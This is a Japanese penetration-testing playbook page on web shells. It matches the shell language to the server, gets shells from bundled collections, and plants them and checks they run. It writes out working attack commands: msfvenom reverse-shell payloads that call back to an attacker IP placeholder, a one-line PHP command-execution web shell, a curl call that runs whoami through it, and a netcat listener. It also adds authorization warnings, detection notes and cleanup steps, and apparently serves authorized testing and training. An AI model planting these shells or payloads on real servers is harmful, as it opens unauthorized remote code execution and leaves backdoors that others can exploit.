# Web Shells（入手元・言語選択・設置）

> **スコープ:** 「**書き込み経路を確保した後、何の webshell を・どこから入手し・どう設置・実行確認するか**」を 1 ファイルに集約する。書き込み経路そのもの（ファイルアップロード機能のバイパス／FTP・SMB 書込／SQLi の `INTO OUTFILE` 等）は各経路のファイルを参照。アップロードフィルタの回避手法は `File_Upload.md`、設置後のリバースシェル昇格は `Command_Injection.md`（リバースシェル配信節）と `../../06_Concepts/Reverse_Shell.md` を参照。

## 着火条件

以下のいずれかで「**サーバ上に任意ファイルを書き込め、かつそのファイルが Web 経由で実行される見込み**」が立ったとき:

- アップロード機能・設定不備で任意拡張子が書ける（`File_Upload.md`）
- FTP / SMB の書込先が Web の DocumentRoot と同一（`../FTP.md` §5・`../SMB_Windows_Exploitation.md`）
- SQLi の `INTO OUTFILE` / `COPY TO` で webroot にファイルを書ける（`SQLi.md`）
- パストラバーサル + ログ poisoning / 既知 CVE のファイル書込プリミティブ

## 環境前提

- 実行環境: テスター端末で生成 → ターゲットの webroot へ設置
- 必要なツール: `msfvenom`（ペネトレ用 Linux ディストリ標準）、`/usr/share/webshells/` 等の同梱 webshell、`curl`
- 外部リソース依存: GitHub 由来 webshell（p0wny / wwwolf 等）はインターネット要。オフライン環境では**同梱の `/usr/share/` 配下 or `msfvenom` 生成**で完結させる

## 先に確認すること

- **サーバの実行ランタイム**: 拡張子を置けても、**サーバがその言語を解釈できなければ実行されない**（後述 §1）。`Server` / `X-Powered-By` ヘッダー・動作中の既存ページ拡張子（`.php` / `.aspx` / `.jsp`）で確定する → `../../00_Playbook/00_OS_Identification.md`
- **設置先が Web で配信されるパス**: 書けた物理パスと公開 URL の対応（`/var/www/html/` ↔ `http://[TARGET]/`、IIS `C:\inetpub\wwwroot\` ↔ `http://[TARGET]/`）

**攻撃者の思考トレース:** webshell は「書ければ何でも動く」わけではなく、**サーバが解釈できる言語**でなければ拡張子を置いてもソースが平文表示されるか 404 になるだけ。だから「入手元」より先に「**サーバ技術 → 言語**」を確定させる。最小の OS コマンド実行用 webshell（1 ファイル）で `whoami` が返ることを確認してから、リバースシェルに昇格するのが事故が少ない。

---

## 1. サーバ技術 → webshell 言語の選択

**判断表（拡張子は「サーバが実行できるランタイム」に合わせる）:**

| サーバ技術（シグナル） | 使う webshell | 主な拡張子 |
|---|---|---|
| IIS / ASP.NET（`Server: Microsoft-IIS`・`X-AspNet-Version`） | ASP.NET / 古典 ASP | `.aspx` / `.asp` / `.ashx` / `.cer` |
| Apache / Nginx + PHP（`X-Powered-By: PHP`・`.php` ページ稼働） | PHP | `.php` / `.php5` / `.phtml` / `.phar` |
| Tomcat / JBoss / WildFly（`Server: Apache-Coyote`・`.jsp` 稼働・8080） | JSP / WAR | `.jsp` / `.war` |
| ColdFusion | CFML | `.cfm` / `.cfml` |
| Python WSGI / Node 等（フレームワーク直結） | webshell より**直接リバースシェル**が早いことが多い | （`Command_Injection.md` 経由） |

**注意:** **IIS に `.php` を置いても既定では実行されない**（逆も同様で、Apache+PHP に `.aspx` は実行されない）。ソースが平文で返る／ダウンロードされる場合は「言語の不一致」か「ハンドラ未登録」を疑い、稼働中ページの拡張子に合わせ直す。`nginx` は実行エンジン（php-fpm / uWSGI / proxy 先）次第で挙動が変わるため、**実在する `.php` 等のページが 200 で動いているか**で判断する。

---

## 2. webshell の入手元

**コマンド（ペネトレ用 Linux ディストリ同梱・オフライン可）:**

```bash
# [Attacker] 同梱 webshell の場所（言語別サブフォルダ）
ls /usr/share/webshells/            # asp / aspx / cfm / jsp / perl / php
ls /usr/share/laudanum/             # aspx / php / jsp / cfm（機能別の実用 webshell 群）
ls /usr/share/seclists/Web-Shells/  # SecLists の webshell コレクション（要 seclists パッケージ）

# [Attacker] 代表ファイルをコピーして使う
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php   # PHP リバースシェル（要 IP/PORT 編集）
cp /usr/share/laudanum/aspx/shell.aspx ./shell.aspx            # ASPX（要 許可IP 編集）
```

**コマンド（msfvenom で生成 — 言語・OS に合わせて作る）:**

```bash
# [Attacker] IIS / Windows 向け ASPX リバースシェル
msfvenom -p windows/shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=[PORT] -f aspx > shell.aspx
# meterpreter が欲しい場合
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[PORT] -f aspx > shell.aspx

# [Attacker] PHP リバースシェル（Apache+PHP 向け）
msfvenom -p php/reverse_php LHOST=[ATTACKER_IP] LPORT=[PORT] -f raw > shell.php

# [Attacker] Tomcat 向け WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=[PORT] -f war > shell.war
```

**観測される出力 → 次のアクション:**

| 観測 | 示唆 | 次のアクション |
|---|---|---|
| 同梱 webshell に該当言語フォルダがある | コピー編集で即利用可 | LHOST/LPORT・許可 IP を編集 → §3 設置 |
| `/usr/share/seclists/` が無い | seclists 未導入 | パッケージ導入、または `/usr/share/webshells/` / `msfvenom` で代替 |
| インターネット利用可・公開ソースが欲しい | GitHub 由来の軽量 webshell | p0wny-shell（PHP 単一ファイル）・wwwolf-php-webshell・antak（ASPX, Nishang）等 |

**注意:** **同梱 / 公開 webshell は LHOST・LPORT・許可 IP がプレースホルダや他人の値のまま**のことがある。設置前に必ず中身を開いて自分の到達可能 IP（`ip a` で確認）に書き換える。バックドア混入の懸念があるため、公開ソースは設置前に目視する（`File_Upload.md` の「PoC 信頼性確認」と同じ姿勢）。

---

## 3. 設置と実行確認

**コマンド:**

```bash
# [Attacker] まず最小の OS コマンド実行 webshell で疎通確認（リバースより先）
# 例: PHP 1 行 webshell
echo '<?php system($_GET["c"]); ?>' > cmd.php
# 例: ASPX で cmd 実行（最小確認用）— 同梱 cmdasp.aspx 等を利用

# 書込経路で webroot に設置（経路は各ファイル参照）後、ブラウザ / curl で実行
curl "http://[TARGET_IP]/cmd.php?c=whoami"
# → [HOSTNAME]\[USER] 等が返れば実行成立

# [Attacker] リバースシェルを受けるリスナー（昇格前に起動しておく）
nc -lvnp [PORT]
```

**観測される出力 → 次のアクション:**

| 観測 | 示唆 | 次のアクション |
|---|---|---|
| `whoami` 等のコマンド結果が返る | webshell 実行成立 | §4 リバースシェル昇格へ |
| ソースコードが平文で表示される / ファイルがダウンロードされる | サーバが言語を実行していない（言語不一致・ハンドラ未登録） | §1 で稼働中ページの拡張子に合わせ直す |
| `403 Forbidden` / `404` | 設置パスが公開されていない / 実行権限なし | 別の書込可能・公開ディレクトリ（`uploads/` 等）を試す |
| `500 Internal Server Error` | webshell の文法エラー / ランタイム不一致 | 同梱の最小 webshell に差し替えて切り分け |

**注意:** いきなりリバースシェル webshell を置くより、**まず `system()` / cmd 実行の最小 webshell で `whoami` を返させる**方が「実行できているか／言語が合っているか」を切り分けやすい。疎通確認後にリバースシェルへ進む。

---

## 4. webshell → リバースシェル昇格

最小 webshell で実行が確認できたら、対話シェルへ昇格する。手順は既存ファイルに集約:

- リバースシェル payload の選択・配信・受信 → `Command_Injection.md`（リバースシェル配信節）
- なぜバインドではなくリバースか・攻撃側リスナーの準備 → `../../06_Concepts/Reverse_Shell.md`
- 取得後の TTY 安定化 → `../../03_Post_Access_Linux/Shell_Stabilization.md`（Linux）

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| 拡張子は置けるがソースが平文表示 | サーバが言語を実行しない（言語不一致） | §1 で稼働ページの拡張子に合わせる・別ランタイムを確認 |
| webshell 設置先が Web で見えない | 書込パス ≠ DocumentRoot | 公開ディレクトリを探す（`uploads/` `pub/`）・別書込経路 |
| 実行はできるがリバースが返らない | 送信方向 FW / IP 不一致 / ポート閉 | 到達可能 IP を `ip a` で再確認・別ポート・バインド型回避は `../../06_Concepts/Reverse_Shell.md` |
| アップロードフィルタで弾かれる | 拡張子 / MIME / マジックバイト検証 | `File_Upload.md` のバイパス各種へ |

## 注意点・落とし穴

> **[HIGH IMPACT]** webshell 設置は **「初期侵入の RCE 経路の確立」そのもの**。本番では事前合意が無い限り設置に進まず、書込可否の確認止まりにする。
> - [x] 不可逆な設定変更を含む（webshell ファイルの残置 ＝ 第三者から悪用可能なバックドア）
> - [x] SIEM/EDR で確実に検知される（webroot への新規 `.php`/`.aspx` 書込・不審 User-Agent からの実行）

> **原状回復必須:** 設置した webshell は**テスト完了後に必ず削除**する。残置すると認証なしで誰でも RCE できる状態を作ってしまう。設置ファイル名はテスト識別子を含め（例: `kedalab_[CASE_ID].aspx`）、`curl "http://[TARGET]/"` でのファイル列挙 → 削除、または書込経路（FTP `DELE` / アップロード機能の delete）で除去する。

### 本番での前提

- **事前合意の要否**: ★★★（書面承認必須 — webshell 設置は RCE 経路確立）。書込可否の確認のみは ★★
- **想定される SIEM / EDR 検知**: webroot への実行可能ファイル新規作成、WAF の webshell シグネチャ、不審 UA からの `?cmd=` / `?c=` パターン
- **業務影響リスク**: 残置 webshell の第三者悪用、誤った設置による既存ファイル上書き
- **原状回復必須項目**: ✅ 設置した webshell の削除 / ✅ 編集・上書きした既存ファイルの復元 / ✅ 取得した認証情報・データの破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

## 関連技術

- 前：アップロードフィルタのバイパスで任意拡張子を書く → `File_Upload.md`
- 前：FTP / SMB の書込先が webroot と同一 → `../FTP.md`（§5 書込テスト）・`../SMB_Windows_Exploitation.md`
- 前：SQLi の `INTO OUTFILE` / `COPY TO PROGRAM` で webroot に書く → `SQLi.md`
- 前：サーバ技術・OS の確定（言語選択の前提） → `../../00_Playbook/00_OS_Identification.md`
- 後：webshell からリバースシェルへ昇格 → `Command_Injection.md`（リバースシェル配信節）・`../../06_Concepts/Reverse_Shell.md`
- 後：取得シェルの安定化 → `../../03_Post_Access_Linux/Shell_Stabilization.md`
- 後：Windows で初期シェル取得後の列挙 → `../../04_Post_Access_Windows_AD/Enumeration_Checklist.md`
